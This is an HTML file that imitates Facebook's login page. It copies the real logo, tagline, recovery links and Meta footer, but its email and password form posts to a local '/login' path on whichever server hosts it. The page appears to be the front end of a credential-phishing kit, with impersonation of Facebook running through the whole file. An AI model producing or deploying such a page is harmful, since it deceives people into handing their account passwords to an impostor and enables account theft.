<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log in or Sign Up</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-left">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
                <p class="tagline">Connect with friends and the world around you on Facebook.</p>
            </div>
            <div class="col-right">
                <div class="login-box">
                    <form action="/login" method="POST">
                        <input type="text" name="username" placeholder="Email or phone number" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit" class="login-btn">Log In</button>
                        <a href="https://facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0NDY0NzI1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next" class="forgot-password">Forgot password?</a>
                        <div class="divider"></div>
                        <a href="https://facebook.com"><button type="button" class="create-account">Create New Account</button></a>
                    </form>
                </div>
                <p class="create-page"><a href="https://web.facebook.com/pages/create/?ref_type=registration_form" class="create-page-link">Create a Page</a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>
    <footer>
        <div>Meta Â© 2023</div>
    </footer>
</body>
</html>
